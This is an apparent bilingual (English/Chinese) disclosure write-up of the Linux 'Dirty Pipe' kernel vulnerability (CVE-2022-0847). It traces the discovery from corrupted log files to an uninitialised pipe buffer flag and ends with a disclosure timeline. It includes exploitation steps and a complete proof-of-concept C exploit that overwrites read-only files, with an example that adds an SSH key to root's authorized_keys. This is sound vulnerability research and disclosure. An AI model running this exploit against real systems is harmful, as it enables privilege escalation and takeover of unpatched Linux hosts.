https://dirtypipe.cm4all.com/

# The Dirty Pipe Vulnerability
# 脏管漏洞
Max Kellermann <max.kellermann@ionos.com>

## Abstract
## 概览


This is the story of CVE-2022-0847, a vulnerability in the Linux kernel since 5.8 which allows overwriting data in arbitrary read-only files. This leads to privilege escalation because unprivileged processes can inject code into root processes.
以下是CVE-2022-0847的简介，这是一个从Linux内核5.8版本就存在的漏洞，它允许覆写任意只读文件，因而可以在非特权进程向root进程注入任意代码，从而实现提权。

It is similar to CVE-2016-5195 “Dirty Cow” but is easier to exploit.
它和CVE-2016-5195脏牛漏洞有点类似，但更容易被利用。

The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.
该漏洞已在 Linux 5.16.11、5.15.25 和 5.10.102 版本中修复。

Corruption pt. I
损坏点 I
It all started a year ago with a support ticket about corrupt files. A customer complained that the access logs they downloaded could not be decompressed. And indeed, there was a corrupt log file on one of the log servers; it could be decompressed, but gzip reported a CRC error. I could not explain why it was corrupt, but I assumed the nightly split process had crashed and left a corrupt file behind. I fixed the file’s CRC manually, closed the ticket, and soon forgot about the problem.
这一切源于一年前的一个损坏文件支持工单：一个客户抱怨下载的访问日志文件无法解压，而且，其中一台日志服务器上有一个损坏的日志文件，虽然可以解压，但是gzip报了CRC错误。我无法解释它为什么损坏，我认为是间夜日志拆分进程崩溃了并且产生了一个损坏文件，于是我手动修复了那个文件的CRC，关闭了工单，然后很快就忘记了这个问题。

Months later, this happened again and yet again. Every time, the file’s contents looked correct, only the CRC at the end of the file was wrong. Now, with several corrupt files, I was able to dig deeper and found a surprising kind of corruption. A pattern emerged.
几个月后，这种情况一次又一次出现，而且每次文件内容看起来都是正确的，只是文件末尾的 CRC 不对。现在，有了几个损坏的文件，我深入的挖掘并发现了这种令人惊讶的损坏方式，终于找到规律了。

Access Logging
访问日志
Let me briefly introduce how our log server works: In the CM4all hosting environment, all web servers (running our custom open source HTTP server) send UDP multicast datagrams with metadata about each HTTP request. These are received by the log servers running Pond, our custom open source in-memory database. A nightly job splits all access logs of the previous day into one per hosted web site, each compressed with zlib.
先让我简单介绍一下我们的日志服务器是如何工作的：在 CM4all 托管环境中，所以Web服务器（运行着我们定制的开源 HTTP 服务）发送携带着每一个 HTTP 请求元数据的多播 UDP 数据报文。这些报文被运行着 Pond（我们定制的开源内存数据库）的日志服务器接收。一个间夜拆分任务将所有的访问日志根据托管网站拆分成单独的文件，然后用 zlib 进行压缩。

Via HTTP, all access logs of a month can be downloaded as a single .gz file. Using a trick (which involves Z_SYNC_FLUSH), we can just concatenate all gzipped daily log files without having to decompress and recompress them, which means this HTTP request consumes nearly no CPU. Memory bandwidth is saved by employing the splice() system call to feed data directly from the hard disk into the HTTP connection, without passing the kernel/userspace boundary (“zero-copy”).
通过 HTTP，可以将一个月内所有的访问日志文件下载为单个 .gz 文件。通过一点技巧（涉及 Z_SYNC_FLUSH），在无需解压缩重新压缩的情况，可以拼接一个月内所有 gzip 压缩的每日日志文件。这意味着这个 HTTP 请求几乎不占用 CPU。通过调用 splice() 这个系统调用将数据直接从硬盘传输到 HTTP 连接，而无需通过内核/用户空间边界（“零拷贝”）。

Windows users can’t handle .gz files, but everybody can extract ZIP files. A ZIP file is just a container for .gz files, so we could use the same method to generate ZIP files on-the-fly; all we needed to do was send a ZIP header first, then concatenate all .gz file contents as usual, followed by the central directory (another kind of header).
Windows 用户无法处理 .gz 文件，但每个人都可以提取 ZIP 压缩文件。ZIP 文件支持 .gz 文件的容器，所以我们可以使用相同的方式即使生成 ZIP 文件。首先我们需要做的是先发送一个 ZIP 文件头，让后像往常一样拼接所有的 .gz 文件内容，然后是中央目录（另一种头信息）。


Corruption pt. II
损坏点II
This is how a the end of a proper daily file looks:
这是一个日常正常文件的结尾内容:

000005f0  81 d6 94 39 8a 05 b0 ed  e9 c0 fd 07 00 00 ff ff
00000600  03 00 9c 12 0b f5 f7 4a  00 00
The 00 00 ff ff is the sync flush which allows simple concatenation. 03 00 is an empty “final” block, and is followed by a CRC32 (0xf50b129c) and the uncompressed file length (0x00004af7 = 19191 bytes).
00 00 ff ff 是常规拼接的同步对齐标记，03 00 空结束标记，紧接着是CRC32（0xf50b129c）和未压缩的文件长度（0x00004af7 = 19191 字节）。

The same file but corrupted:
相同的但已损坏的文件：

000005f0  81 d6 94 39 8a 05 b0 ed  e9 c0 fd 07 00 00 ff ff
00000600  03 00 50 4b 01 02 1e 03  14 00
The sync flush is there, the empty final block is there, but the uncompressed length is now 0x0014031e = 1.3 MB (that’s wrong, it’s the same 19 kB file as above). The CRC32 is 0x02014b50, which does not match the file contents. Why? Is this an out-of-bounds write or a heap corruption bug in our log client?
同步对齐、空结束标记都在那里，但是未压缩文件长度却是 0x0014031e = 1.3 MB（这是错误的，实际应该和上面一样也是19KB）。CRC32 是 0x02014b50，和文件内容也不匹配。为什么呢？这是我们的日志客户端里面有越界写入还是堆损坏问题？

I compared all known-corrupt files and discovered, to my surprise, that all of them had the same CRC32 and the same “file length” value. Always the same CRC - this implies that this cannot be the result of a CRC calculation. With corrupt data, we would see different (but wrong) CRC values. For hours, I stared holes into the code but could not find an explanation.
我比较了所以已知的损坏文件，并且让人惊讶的发现，它们都具有相同的 CRC32 与“文件长度”值。始终相同的 CRC，这意味着这不可能是 CRC 计算的结果。对于损坏的数据，我们会看到不同的（但错误的）CRC 值。几个小时下来，我一直盯着代码中的漏洞，但不知如何解释。

Then I stared at these 8 bytes. Eventually, I realized that 50 4b is ASCII for “P” and “K”. “PK”, that’s how all ZIP headers start. Let’s have a look at these 8 bytes again:
然后我盯着这8个字节。最终，我意识到 50 4b 是“P”和“K”的 ASCII 码。 “PK”，就是所有 ZIP 文件头。让我们再看看这 8 个字节：

“需要提取的版本” = 14 00； 0x0014 = 20 (2.0)

50 4b 01 02 1e 03 14 00
50 4b is “PK”
50 4b 是“PK”

01 02 is the code for central directory file header.
01 02 是中央目录的代码。

“Version made by” = 1e 03; 0x1e = 30 (3.0); 0x03 = UNIX

“Version needed to extract” = 14 00; 0x0014 = 20 (2.0)

The rest is missing; the header was apparently truncated after 8 bytes.
其余的都不见了，文件头似乎在8字节后被截断了。

This is really the beginning of a ZIP central directory file header, this cannot be a coincidence. But the process which writes these files has no code to generate such header. In my desperation, I looked at the zlib source code and all other libraries used by that process but found nothing. This piece of software doesn’t know anything about “PK” headers.
这确实是中央目录文件头的开头，绝非巧合，但是写入这些文件的进程没有生成此文件头的代码。绝望中，我查看了zlib的源代码和该进程使用到的其他库，但仍一无所获。该软件和“PK”文件头毫不相干。

There is one process which generates “PK” headers, though; it’s the web service which constructs ZIP files on-the-fly. But this process runs as a different user which doesn’t have write permissions on these files. It cannot possibly be that process.
但是，有一个进程会生成“PK”文件头，那就是即使构建 ZIP 文件的 Web 服务，但是该进程以一个对这些文件没有写权限的用户运行着，不可能是那个进程。

None of this made sense, but new support tickets kept coming in (at a very slow rate). There was some systematic problem, but I just couldn’t get a grip on it. That gave me a lot of frustration, but I was busy with other tasks, and I kept pushing this file corruption problem to the back of my queue.
这些分析都没有意义，但新的支持工单不断涌入（速度非常缓慢）。有一些系统性的问题，但我找不到关键问题点。这让我非常沮丧，但我仍忙于处理其他任务，于是一直没把这个文件损坏问题放在心上。

Corruption pt. III
损坏点III
External pressure brought this problem back into my consciousness. I scanned the whole hard disk for corrupt files (which took two days), hoping for more patterns to emerge. And indeed, there was a pattern:
外部的压力让我重新捡起了这个问题，我扫码了整个硬盘上的损坏文件（花了两天时间），希望能找到更多的规律，确实，发现了一个规律：

there were 37 corrupt files within the past 3 months
过去的3个月里有37个损坏文件

they occurred on 22 unique days
它们发生在22个不同的日子

18 of those days have 1 corruption
有18天各有1个损坏

1 day has 2 corruptions (2021-11-21)
有1天有2个损坏（2021-11-21）

1 day has 7 corruptions (2021-11-30)
有1天有7个损坏（2021-11-30）

1 day has 6 corruptions (2021-12-31)
有1天有6个损坏（2021-11-31）

1 day has 4 corruptions (2022-01-31)
有1天有4个损坏（2022-01-31）

The last day of each month is clearly the one which most corruptions occur.
每个月的最后一天显然是最容易发生损坏的一天。

Only the primary log server had corruptions (the one which served HTTP connections and constructed ZIP files). The standby server (HTTP inactive but same log extraction process) had zero corruptions. Data on both servers was identical, minus those corruptions.
只有主日志服务器有损坏（提供 HTTP 连接和构建 ZIP 文件的服务器）。备用服务器（HTTP 暂停，但有着相同的日志提取过程）上没有损坏。除了那些损坏文件外，两台服务器上的数据都是相同的。

Is this caused by flaky hardware? Bad RAM? Bad storage? Cosmic rays? No, the symptoms don’t look like a hardware issue. A ghost in the machine? Do we need an exorcist?
这是由片状硬件造成的吗？内存异常？存储异常？或者宇宙射线？都不是，这些症状看着不像硬件问。难道机器里有鬼不成，我们需要驱鬼人吗？

Man staring at code
盯着代码的人
I began staring holes into my code again, this time the web service.
我再次开始盯着我的代码，这次是 Web 服务的。

Remember, the web service writes a ZIP header, then uses splice() to send all compressed files, and finally uses write() again for the “central directory file header”, which begins with 50 4b 01 02 1e 03 14 00, exactly the corruption. The data sent over the wire looks exactly like the corrupt files on disk. But the process sending this on the wire has no write permissions on those files (and doesn’t even try to do so), it only reads them. Against all odds and against the impossible, it must be that process which causes corruptions, but how?
还记得，Web 服务先写了一个 ZIP 文件头，然后用 splice() 方法发送所以压缩文件，最后再使用 write() 方法写“中央目录文件头”，它以 50 4b 01 02 1e 03 14 00 开头，刚好是一个损坏点。通过网络发送的数据看起来与磁盘上的文件完全一致。但是通过网络发送这些数据的进程并没有那些文件的写权限（甚至也没有尝试这么做），它只是读取这些文件而已。尽快情况不对劲也不可能，但肯定是那个进程造成的损坏，可是如何产生的呢？

My first flash of inspiration why it’s always the last day of the month which gets corrupted. When a website owner downloads the access log, the server starts with the first day of the month, then the second day, and so on. Of course, the last day of the month is sent at the end; the last day of the month is always followed by the “PK” header. That’s why it’s more likely to corrupt the last day. (The other days can be corrupted if the requested month is not yet over, but that’s less likely.)
我的第一个灵感浮出脑海：为什么总是每个月的最后一天出现文件损坏呢。当一个网站主下载访问日志时，服务器会从当月的第一天开始，然后第二天，直至最后一天。必然，每月的最后一天必定是最后发送；然后每月最后一天总是追加了一个“PK”头。这就是为什么它总是在最后一天损坏。（如果请求的月份还没结束，那么其他日子也会造成损坏，不过这不大可能发送。）
How?
如何产生的呢？

Man staring at kernel code
继续盯着内核代码
After being stuck for more hours, after eliminating everything that was definitely impossible (in my opinion), I drew a conclusion: this must be a kernel bug.
被卡主了几个小时之后，在排除了所以不可能的问题之后（在我看来），我得出了一个结论：这肯定是一个内核错误。

Blaming the Linux kernel (i.e. somebody else’s code) for data corruption must be the last resort. That is unlikely. The kernel is an extremely complex project developed by thousands of individuals with methods that may seem chaotic; despite of this, it is extremely stable and reliable. But this time, I was convinced that it must be a kernel bug.
将数据损坏归因于 Linux 内核错误肯定是最后的判断。一般是不大可能发生的。内核是一个由成千上万的人使用看似混乱的方法开发的极其复杂的工程，尽管如此，它还是十分稳定与可靠的。但这次，我坚信这肯定是一个内核错误。

In a moment of extraordinary clarity, I hacked two C programs.
在一个状态比较好的情况下，我整出了两个 C 程序。

One that keeps writing odd chunks of the string “AAAAA” to a file (simulating the log splitter):
一个持续往文件写入奇数长度的字符串“AAAAA”（模拟日志拆分器）：

```
#include <unistd.h>
int main(int argc, char **argv) {
  for (;;) write(1, "AAAAA", 5);
}
```
// ./writer >foo
And one that keeps transferring data from that file to a pipe using splice() and then writes the string “BBBBB” to the pipe (simulating the ZIP generator):
另一个持续先使用 splice() 方法从该文件往pipe管道传输数据，然后往pipe管道写入“BBBBB”字符串（模拟 ZIP 生成器）

```
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
int main(int argc, char **argv) {
  for (;;) {
    splice(0, 0, 1, 0, 2, 0);
    write(1, "BBBBB", 5);
  }
}
```
// ./splicer <foo |cat >/dev/null
I copied those two programs to the log server, and… bingo! The string “BBBBB” started appearing in the file, even though nobody ever wrote this string to the file (only to the pipe by a process without write permissions).
我将这两个程序拷贝到日志服务器，然后，奇迹出现了！字符串“BBBBB”出现在文件里面，尽管没人写入这些字符串到这个文件（只是由一个没有该文件写权限的进程写入pipe管道而已）

So this really is a kernel bug!
所以这真的是一个内核错误！

All bugs become shallow once they can be reproduced. A quick check verified that this bug affects Linux 5.10 (Debian Bullseye) but not Linux 4.19 (Debian Buster). There are 185.011 git commits between v4.19 and v5.10, but thanks to git bisect, it takes just 17 steps to locate the faulty commit.
一旦可以复现，所有的错误就变得浅显易懂了。快速检查确认出这个错误影响了 Linux 5.10 (Debian Bullseye)，Linux 4.19 (Debian Buster)却未受影响。在 v4.19 版本到v5.10 版本之间总共有 185011 个提交，但借助二分法，只需要17次就可以定位到错误的提交记录。


The bisect arrived at commit f6dd975583bd, which refactors the pipe buffer code for anonymous pipe buffers. It changes the way how the “mergeable” check is done for pipes.
二分法到达 f6dd975583bd 这个提交点时，我们发现这里为匿名管道缓冲区重构了管道缓冲区代码，它改变了对管道进行“可合并”检查的方式。

Pipes and Buffers and Pages
管道、缓冲区和页面
Why pipes, anyway? In our setup, the web service which generates ZIP files communicates with the web server over pipes; it talks the Web Application Socket protocol which we invented because we were not happy with CGI, FastCGI and AJP. Using pipes instead of multiplexing over a socket (like FastCGI and AJP do) has a major advantage: you can use splice() in both the application and the web server for maximum efficiency. This reduces the overhead for having web applications out-of-process (as opposed to running web services inside the web server process, like Apache modules do). This allows privilege separation without sacrificing (much) performance.
为什么是管道呢？在我们的设置中，生成 ZIP 的 Web 服务通过管道与 Web 服务器进行通信，因为我们不满足于 CGI、FastCGI 与 AJP 协议，所以我们在这之间自创了一套 Web 应用程序套接字协议。使用管道替代多路复用套接字（如 FastCGI 与 AJP 所做的），有一个主要的优点：您可以在 Web 应用程序与 Web 服务器之间使用 splice() 方法以获得最大传输效率。这减少了让 Web 应用程序脱离进程的开销（与在 Web 服务器进程内运行 Web 服务相反，就行 Apache 模块那样），还允许在不损失性能的情况下进行权限分离。

Short detour on Linux memory management: The smallest unit of memory managed by the CPU is a page (usually 4 kB). Everything in the lowest layer of Linux’s memory management is about pages. If an application requests memory from the kernel, it will get a number of (anonymous) pages. All file I/O is also about pages: if you read data from a file, the kernel first copies a number of 4 kB chunks from the hard disk into kernel memory, managed by a subsystem called the page cache. From there, the data will be copied to userspace. The copy in the page cache remains for some time, where it can be used again, avoiding unnecessary hard disk I/O, until the kernel decides it has a better use for that memory (“reclaim”). Instead of copying file data to userspace memory, pages managed by the page cache can be mapped directly into userspace using the mmap() system call (a trade-off for reduced memory bandwidth at the cost of increased page faults and TLB flushes). The Linux kernel has more tricks: the sendfile() system call allows an application to send file contents into a socket without a roundtrip to userspace (an optimization popular in web servers serving static files over HTTP). The splice() system call is kind of a generalization of sendfile(): It allows the same optimization if either side of the transfer is a pipe; the other side can be almost anything (another pipe, a file, a socket, a block device, a character device). The kernel implements this by passing page references around, not actually copying anything (zero-copy).
Linux 内存管理最小化原则：CPU 管理的最小内存单元是页（通常是4kB），Linux 内存管理的最底层的一切都是关于页的。如果应用向内核请求内存，它将获得许多（匿名）页。所以文件 I/O 也与页有关。如果你从一个文件读取数据，内核首先将大量的 4kB 块从硬盘复制到内核内存中，由称为页缓存的子系统进行管理.从那里，数据将被复制到用户空间。页面缓存中的副本将会保留一段时间，从而可以复用，以避免不必要的硬盘 I/O, 直到内核决定它可以更好的使用该内存（回收）。页面缓存管理的页可以使用 mmap() 系统调用（以增加页面错误和 TLB 刷新为代价来减少内存带宽）直接将数据映射到用户空间，而无需将数据拷贝到用户内存。Linux 内核有更多的技巧：sendfile() 系统调用允许应用程序将文件内容发送到套接字，而无需往返用户空间（这是在通过 HTTP 提供 Web 服务场景下流行的优化方式）；splice() 系统调用是 sendfile() 的一种概括，如果传输的任一侧是管道，它提供了相同的优化。另一端几乎可以是任何东西（另一个管道、文件、套接字、块设备、字符设备）。内核通过传递页面引用来实现这一点，而不是实际复制任何东西（即零复制）。

A pipe is a tool for unidirectional inter-process communication. One end is for pushing data into it, the other end can pull that data. The Linux kernel implements this by a ring of struct pipe_buffer, each referring to a page. The first write to a pipe allocates a page (space for 4 kB worth of data). If the most recent write does not fill the page completely, a following write may append to that existing page instead of allocating a new one. This is how “anonymous” pipe buffers work (anon_pipe_buf_ops).
管道是一个用于进程间单向通信的工具，一端用于将数据推送至其中，另一端可以提取数据。Linux 内核通过一个struct pipe_buffer环来实现这一点，每个 struct pipe_buffer 都指向一个页面。第一次写入管道会分配一个页面（4 kB 数据空间）。如果最近的写入没有完全填满页，则后续写入可能会附加到该现有页而不是分配新页。这就是“匿名”管道缓冲区的工作方式（anon_pipe_buf_ops）。

If you, however, splice() data from a file into the pipe, the kernel will first load the data into the page cache. Then it will create a struct pipe_buffer pointing inside the page cache (zero-copy), but unlike anonymous pipe buffers, additional data written to the pipe must not be appended to such a page because the page is owned by the page cache, not by the pipe.
但是，如果你将文件中的数据通过 splice() 传输进管道，内核会先将数据加载进页缓存，然后创建一个 struct pipe_buffer 实例指向页缓存（零复制），但与匿名管道缓冲区不同的是，写入管道的附加数据不能附加到此页，因为该页由页缓存拥有，而不是由管道。

History of the check for whether new data can be appended to an existing pipe buffer:
检查是否可以将新数据附加到现有管道缓冲区的历史记录：

Long ago, struct pipe_buf_operations had a flag called can_merge.
很久以前，struct pipe_buf_operations 有一个名为 can_merge 的标签。

Commit 5274f052e7b3 “Introduce sys_splice() system call” (Linux 2.6.16, 2006) featured the splice() system call, introducing page_cache_pipe_buf_ops, a struct pipe_buf_operations implementation for pipe buffers pointing into the page cache, the first one with can_merge=0 (not mergeable).
提交 5274f052e7b3 “Introduce sys_splice() system call” (Linux 2.6.16, 2006) splice() 系统调用特性，引入了 page_cache_pipe_buf_ops，一个用于指向页缓存的管道缓冲区的结构 pipe_buf_operations 的实现，前者 can_merge=0 (不可合并）。

Commit 01e7187b4119 “pipe: stop using ->can_merge” (Linux 5.0, 2019) converted the can_merge flag into a struct pipe_buf_operations pointer comparison because only anon_pipe_buf_ops has this flag set.
提交 01e7187b4119 “pipe: stop using ->can_merge” (Linux 5.0, 2019) 将 can_merge 标志转换为 struct pipe_buf_operations 指针比较器，因为只有 anon_pipe_buf_ops 设置了此标志。

Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops” (Linux 5.8, 2020) converted this pointer comparison to per-buffer flag PIPE_BUF_FLAG_CAN_MERGE.
提交 f6dd975583bd “pipe: merge anon_pipe_buf*_ops” (Linux 5.8, 2020) 将此指针比较器转换为 per-buffer 标签 PIPE_BUF_FLAG_CAN_MERGE。

Over the years, this check was refactored back and forth, which was okay. Or was it?
这一年里，这个正常的检查被来回重构，不是吗？

Uninitialized
未初始化
Several years before PIPE_BUF_FLAG_CAN_MERGE was born, commit 241699cd72a8 “new iov_iter flavour: pipe-backed” (Linux 4.9, 2016) added two new functions which allocate a new struct pipe_buffer, but initialization of its flags member was missing. It was now possible to create page cache references with arbitrary flags, but that did not matter. It was technically a bug, though without consequences at that time because all of the existing flags were rather boring.
PIPE_BUF_FLAG_CAN_MERGE 诞生几年前，提交 241699cd72a8 “new iov_iter flavour: pipe-backed” (Linux 4.9, 2016) 添加了两个新功能，它们分配了一个新的 struct pipe_buffer，但缺少了对 flags 成员的初始化。现在可以使用任意 flags 创建页面缓存引用，但这并不重要。基于现有的 flags 都没什么用，所以当时没有产生任何不良后果，但技术上讲还是个错误。

This bug suddenly became critical in Linux 5.8 with commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops”. By injecting PIPE_BUF_FLAG_CAN_MERGE into a page cache reference, it became possible to overwrite data in the page cache, simply by writing new data into the pipe prepared in a special way.
通过提交 f6dd975583bd “pipe: merge anon_pipe_buf*_ops”， Linux 5.8 上这个错误突然变得很严重。通过将 PIPE_BUF_FLAG_CAN_MERGE 注入一个页缓存引用，这使覆盖页缓存数据成为可能，只需要将新数据写入以一个特殊方式准备好的管道。

Corruption pt. IV
This explains the file corruption: First, some data gets written into the pipe, then lots of files get spliced, creating page cache references. Randomly, those may or may not have PIPE_BUF_FLAG_CAN_MERGE set. If yes, then the write() call that writes the central directory file header will be written to the page cache of the last compressed file.
损坏点 IV
这就可以解释文件损坏：首先，一些数据被写入管道，然后大量文件被拼接，创建页缓存引用。随机地，那些可能有也可能没有 PIPE_BUF_FLAG_CAN_MERGE 设置。如果是，那么写入中央目录文件头的 write() 调用将被写入最后一个压缩文件的页面缓存。

But why only the first 8 bytes of that header? Actually, all of the header gets copied to the page cache, but this operation does not increase the file size. The original file had only 8 bytes of “unspliced” space at the end, and only those bytes can be overwritten. The rest of the page is unused from the page cache’s perspective (though the pipe buffer code does use it because it has its own page fill management).
但为什么只有标头的前 8 个字节？实际上，所有标头都被复制到页缓存中，且此操作不会增加文件大小。原始文件最后只有 8 个字节的“未拼接”空间，只有这些字节可以被覆盖。从页缓存的角度来看，页的其余部分是未使用的（尽快管道缓冲区代码确实使用它，因为它有自己的也填充管理）。

And why does this not happen more often? Because the page cache does not write back to disk unless it believes the page is “dirty”. Accidently overwriting data in the page cache will not make the page “dirty”. If no other process happens to “dirty” the file, this change will be ephemeral; after the next reboot (or after the kernel decides to drop the page from the cache, e.g. reclaim under memory pressure), the change is reverted. This allows interesting attacks without leaving a trace on hard disk.
为什么这种情况不会频繁地发送？因为页缓存不会写回磁盘，除非它认为页是“脏”的。意外覆盖页缓存中的数据不会使页变“脏”。如果没有其他进程碰巧“弄脏”该文件，则此更改将是短暂的；在下一次重新启动后（或在内核决定从缓存中删除页后，例如在内存压力下回收），更改将被恢复。这允许有趣的攻击发生，而不会在硬盘上留下痕迹。

Exploiting
In my first exploit (the “writer” / “splicer” programs which I used for the bisect), I had assumed that this bug is only exploitable while a privileged process writes the file, and that it depends on timing.
利用
在我的第一个漏洞利用（我用于 bisect 的“writer”/“splicer”程序）中，我假设这个 bug 只能在特权进程写入文件时利用，并且它取决于时间。


When I realized what the real problem was, I was able to widen the hole by a large margin: it is possible to overwrite the page cache even in the absence of writers, with no timing constraints, at (almost) arbitrary positions with arbitrary data. The limitations are:
当我意识到真正的问题是什么时，我能够放大这个漏洞：即使在没有写入器的情况下，也可以在任意位置用任意数据覆盖页缓存，限制是：

the attacker must have read permissions (because it needs to splice() a page into a pipe)
攻击者必须有读权限（因为它需要通过 splice() 方法将将页输入管道中）

the offset must not be on a page boundary (because at least one byte of that page must have been spliced into the pipe)
偏移量不能在页边界上（因为页上至少有一个字节已经拼接到管道中）

the write cannot cross a page boundary (because a new anonymous buffer would be created for the rest)
写入不能跨越页边界（因为这将为其余部分创建一个新的匿名缓冲区）

the file cannot be resized (because the pipe has its own page fill management and does not tell the page cache how much data has been appended)
文件无法调整大小（因为管道有自己的页面填充管理，并且不会告诉页面缓存附加了多少数据）

To exploit this vulnerability, you need to:
要利用此漏洞你那个，你需要：

Create a pipe.
创建管道

Fill the pipe with arbitrary data (to set the PIPE_BUF_FLAG_CAN_MERGE flag in all ring entries).
用任意数据填充管道（在所以环入口设置 PIPE_BUF_FLAG_CAN_MERGE 标志）

Drain the pipe (leaving the flag set in all struct pipe_buffer instances on the struct pipe_inode_info ring).
排空管道（保留在 struct pipe_inode_info 环上的所有 struct pipe_buffer 实例中设置的标志）

Splice data from the target file (opened with O_RDONLY) into the pipe from just before the target offset.
将目标文件（使用 O_RDONLY 打开）中的数据从目标偏移之前的位置拼接到管道中

Write arbitrary data into the pipe; this data will overwrite the cached file page instead of creating a new anomyous struct pipe_buffer because PIPE_BUF_FLAG_CAN_MERGE is set.
将任意数据写入管道；由于设置了 PIPE_BUF_FLAG_CAN_MERGE，此数据将覆盖缓存的文件页，而不是创建新的异常 struct pipe_buffer


To make this vulnerability more interesting, it not only works without write permissions, it also works with immutable files, on read-only btrfs snapshots and on read-only mounts (including CD-ROM mounts). That is because the page cache is always writable (by the kernel), and writing to a pipe never checks any permissions.
为了让这个漏洞更有趣，它不仅可以在没有写权限的情况下工作，它还可以用于不可变文件、只读 btrfs 快照和只读挂载（包括 CD-ROM 挂载）。这是因为页面缓存始终是可写的（由内核），并且写入管道从不检查任何权限。

This is my proof-of-concept exploit:
这是我的概念验证漏洞利用程序：

```
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    /* the pipe is now empty, and if somebody adds a new
       pipe_buffer without initializing its "flags", the buffer
       will be mergeable */
}

int main(int argc, char **argv)
{
    if (argc != 4) {
        fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
        return EXIT_FAILURE;
    }

    /* dumb command-line argument parser */
    const char *const path = argv[1];
    loff_t offset = strtoul(argv[2], NULL, 0);
    const char *const data = argv[3];
    const size_t data_size = strlen(data);

    if (offset % PAGE_SIZE == 0) {
        fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
        return EXIT_FAILURE;
    }

    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;
    if (end_offset > next_page) {
        fprintf(stderr, "Sorry, cannot write across a page boundary\n");
        return EXIT_FAILURE;
    }

    /* open the input file and validate the specified offset */
    const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    if (fd < 0) {
        perror("open failed");
        return EXIT_FAILURE;
    }

    struct stat st;
    if (fstat(fd, &st)) {
        perror("stat failed");
        return EXIT_FAILURE;
    }

    if (offset > st.st_size) {
        fprintf(stderr, "Offset is not inside the file\n");
        return EXIT_FAILURE;
    }

    if (end_offset > st.st_size) {
        fprintf(stderr, "Sorry, cannot enlarge the file\n");
        return EXIT_FAILURE;
    }

    /* create the pipe with all flags initialized with
       PIPE_BUF_FLAG_CAN_MERGE */
    int p[2];
    prepare_pipe(p);

    /* splice one byte from before the specified offset into the
       pipe; this will add a reference to the page cache, but
       since copy_page_to_iter_pipe() does not initialize the
       "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice failed");
        return EXIT_FAILURE;
    }
    if (nbytes == 0) {
        fprintf(stderr, "short splice\n");
        return EXIT_FAILURE;
    }

    /* the following write will not create a new pipe_buffer, but
       will instead write into the page cache, because of the
       PIPE_BUF_FLAG_CAN_MERGE flag */
    nbytes = write(p[1], data, data_size);
    if (nbytes < 0) {
        perror("write failed");
        return EXIT_FAILURE;
    }
    if ((size_t)nbytes < data_size) {
        fprintf(stderr, "short write\n");
        return EXIT_FAILURE;
    }

    printf("It worked!\n");
    return EXIT_SUCCESS;
}
```

## Timeline
2021-04-29: first support ticket about file corruption

2022-02-19: file corruption problem identified as Linux kernel bug, which turned out to be an exploitable vulnerability

2022-02-20: bug report, exploit and patch sent to the Linux kernel security team

2022-02-21: bug reproduced on Google Pixel 6; bug report sent to the Android Security Team

2022-02-21: patch sent to LKML (without vulnerability details) as suggested by Linus Torvalds, Willy Tarreau and Al Viro

2022-02-23: Linux stable releases with my bug fix (5.16.11, 5.15.25, 5.10.102)

2022-02-24: Google merges my bug fix into the Android kernel

2022-02-28: notified the linux-distros mailing list

2022-03-07: public disclosure